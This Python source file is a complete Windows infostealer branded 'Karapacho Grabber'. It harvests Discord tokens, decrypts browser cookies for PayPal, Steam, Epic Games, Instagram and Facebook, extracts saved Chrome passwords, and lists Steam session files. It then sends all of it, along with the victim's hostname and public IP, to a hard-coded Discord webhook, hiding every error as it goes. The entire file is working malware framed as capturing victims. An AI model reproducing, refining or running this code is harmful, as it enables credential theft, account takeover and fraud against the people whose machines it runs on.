import os
import re
import json
import sqlite3
import shutil
import base64
import requests
import socket
import getpass
import platform
import subprocess
import datetime
from urllib.request import urlopen
from Crypto.Cipher import AES
import win32crypt

# ==================== CONFIGURACIÓN ====================
WEBHOOK_URL = "https://discord.com/api/webhooks/1478598139035385897/XYnTf-XPnYwrp1FXH1RPzlw7w1czPn85qGCdZkt1_KTy5ZCjW7FzMEwnganax5wCT_op"
USER = getpass.getuser()
LOCAL_APP_DATA = os.getenv('LOCALAPPDATA')
APP_DATA = os.getenv('APPDATA')

# ==================== FUNCIONES AUXILIARES ====================
def send_to_discord(embed):
    """Envía un embed al webhook con estilo Karapacho"""
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, headers={"User-Agent": "Mozilla/5.0"})
    except:
        pass

def get_system_info():
    """Información del sistema con emojis de miedo"""
    ip = "Desconocida"
    try:
        ip = urlopen("https://api.ipify.org", timeout=5).read().decode()
    except:
        pass
    return {
        "💀 **Hostname**": socket.gethostname(),
        "👤 **Usuario**": USER,
        "🖥️ **Sistema**": platform.platform(),
        "🌐 **IP Pública**": ip
    }

# ==================== DISCORD TOKENS ====================
def get_discord_tokens():
    """Busca tokens de Discord en múltiples fuentes"""
    tokens = set()
    paths = [
        LOCAL_APP_DATA + r'\Google\Chrome\User Data\Default\Local Storage\leveldb',
        LOCAL_APP_DATA + r'\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb',
        LOCAL_APP_DATA + r'\Microsoft\Edge\User Data\Default\Local Storage\leveldb',
        APP_DATA + r'\discord\Local Storage\leveldb',
    ]
    token_pat = re.compile(r'[a-zA-Z0-9_-]{24,}\.[a-zA-Z0-9_-]{6,}\.[a-zA-Z0-9_-]{27,}')
    mfa_pat = re.compile(r'mfa\.[a-zA-Z0-9_-]{84,}')
    for path in paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith(('.ldb', '.log')):
                    try:
                        with open(os.path.join(path, file), 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            tokens.update(token_pat.findall(content))
                            tokens.update(mfa_pat.findall(content))
                    except:
                        continue
    return list(tokens)

# ==================== COOKIES DE NAVEGADORES (PayPal, Steam, Epic, Instagram, Facebook) ====================
def get_encryption_key(browser_path):
    """Obtiene la clave maestra de Chrome/Edge/Brave"""
    local_state = os.path.join(browser_path, 'Local State')
    if not os.path.exists(local_state):
        return None
    with open(local_state, 'r', encoding='utf-8') as f:
        state = json.load(f)
    key = base64.b64decode(state['os_crypt']['encrypted_key'])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_value(encrypted_value, key):
    """Descifra un valor con AES-GCM"""
    try:
        iv = encrypted_value[3:15]
        payload = encrypted_value[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode('utf-8')
    except:
        return None

def get_cookies_from_browser(browser_name, browser_path, target_domains):
    """Extrae cookies de dominios específicos"""
    cookies = {}
    cookie_db = os.path.join(browser_path, 'Default', 'Network', 'Cookies')
    if not os.path.exists(cookie_db):
        cookie_db = os.path.join(browser_path, 'Default', 'Cookies')
    if not os.path.exists(cookie_db):
        return cookies
    shutil.copy2(cookie_db, 'temp_cookies.db')
    conn = sqlite3.connect('temp_cookies.db')
    cursor = conn.cursor()
    key = get_encryption_key(browser_path)
    if not key:
        os.remove('temp_cookies.db')
        return cookies
    cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
    for host, name, enc_value in cursor.fetchall():
        if any(domain in host for domain in target_domains):
            decrypted = decrypt_value(enc_value, key)
            if decrypted:
                cookies[f"{host} ({name})"] = decrypted
    conn.close()
    os.remove('temp_cookies.db')
    return cookies

# ==================== STEAM LOCAL FILES (ssfn, config.vdf) ====================
def get_steam_files():
    """Busca archivos de sesión de Steam"""
    steam_path = os.path.join(os.getenv('PROGRAMFILES(x86)'), 'Steam')
    if not os.path.exists(steam_path):
        steam_path = os.path.join(os.getenv('PROGRAMFILES'), 'Steam')
    if not os.path.exists(steam_path):
        return []
    found = []
    for file in os.listdir(steam_path):
        if file.startswith('ssfn') or file == 'config.vdf':
            found.append(os.path.join(steam_path, file))
    return found

# ==================== CONTRASEÑAS GUARDADAS (opcional, puede fallar) ====================
def get_saved_passwords():
    """Intenta extraer contraseñas de Chrome (requiere que estén guardadas)"""
    passwords = []
    browser_path = LOCAL_APP_DATA + r'\Google\Chrome\User Data'
    login_db = os.path.join(browser_path, 'Default', 'Login Data')
    if not os.path.exists(login_db):
        return passwords
    shutil.copy2(login_db, 'temp_login.db')
    conn = sqlite3.connect('temp_login.db')
    cursor = conn.cursor()
    key = get_encryption_key(browser_path)
    if not key:
        os.remove('temp_login.db')
        return passwords
    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
    for url, user, enc_pass in cursor.fetchall():
        if user and enc_pass:
            decrypted = decrypt_value(enc_pass, key)
            if decrypted:
                passwords.append(f"🌐 {url}\n   👤 {user}\n   🔑 {decrypted}")
    conn.close()
    os.remove('temp_login.db')
    return passwords

# ==================== FUNCIÓN PRINCIPAL ====================
def main():
    # 1. Sistema
    sys_info = get_system_info()
    sys_text = "\n".join([f"{k}: {v}" for k, v in sys_info.items()])

    # 2. Tokens Discord
    discord_tokens = get_discord_tokens()
    token_text = "No encontrados 💔"
    if discord_tokens:
        token_text = "\n".join(discord_tokens[:5])
        if len(discord_tokens) > 5:
            token_text += f"\n... y {len(discord_tokens)-5} más"

    # 3. Cookies de servicios objetivo
    targets = {
        "paypal": "PayPal",
        "steam": "Steam",
        "epicgames": "Epic Games",
        "instagram": "Instagram",
        "facebook": "Facebook"
    }
    cookies_found = {}
    browsers = [
        ('Chrome', LOCAL_APP_DATA + r'\Google\Chrome\User Data'),
        ('Edge', LOCAL_APP_DATA + r'\Microsoft\Edge\User Data'),
        ('Brave', LOCAL_APP_DATA + r'\BraveSoftware\Brave-Browser\User Data')
    ]
    for browser_name, browser_path in browsers:
        if os.path.exists(browser_path):
            cookies = get_cookies_from_browser(browser_name, browser_path, list(targets.keys()))
            for domain, cookie in cookies.items():
                service = next((targets[k] for k in targets if k in domain), "Otro")
                cookies_found[f"{service} - {domain}"] = cookie

    cookies_text = "No se encontraron cookies activas 😈"
    if cookies_found:
        cookies_text = "\n".join([f"🍪 {k}: {v[:50]}..." for k, v in list(cookies_found.items())[:10]])

    # 4. Archivos Steam
    steam_files = get_steam_files()
    steam_text = "No se encontraron archivos de sesión 🎮"
    if steam_files:
        steam_text = "\n".join(steam_files[:5])

    # 5. Contraseñas guardadas (puede estar vacío)
    passwords = get_saved_passwords()
    pass_text = "No se encontraron contraseñas guardadas 🔒"
    if passwords:
        pass_text = "\n".join(passwords[:5])

    # 6. Construir embed terrorífico
    embed = {
        "title": "💀 **KARAPACHO GRABBER** 💀",
        "description": "**¡Víctima capturada con éxito!**",
        "color": 0x4a0e4e,  # Morado oscuro
        "fields": [
            {"name": "🕷️ **SISTEMA**", "value": sys_text[:1024], "inline": False},
            {"name": "🔮 **TOKENS DISCORD**", "value": token_text[:1024], "inline": False},
            {"name": "🍪 **COOKIES DE SERVICIOS**", "value": cookies_text[:1024], "inline": False},
            {"name": "🎮 **ARCHIVOS STEAM**", "value": steam_text[:1024], "inline": False},
            {"name": "🔑 **CONTRASEÑAS GUARDADAS**", "value": pass_text[:1024], "inline": False}
        ],
        "footer": {"text": "👻 Karapacho Grabber v3.0 • Modo Terror Activado 👻"},
        "timestamp": datetime.datetime.now().isoformat()
    }
    send_to_discord(embed)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        # Silencio total
        pass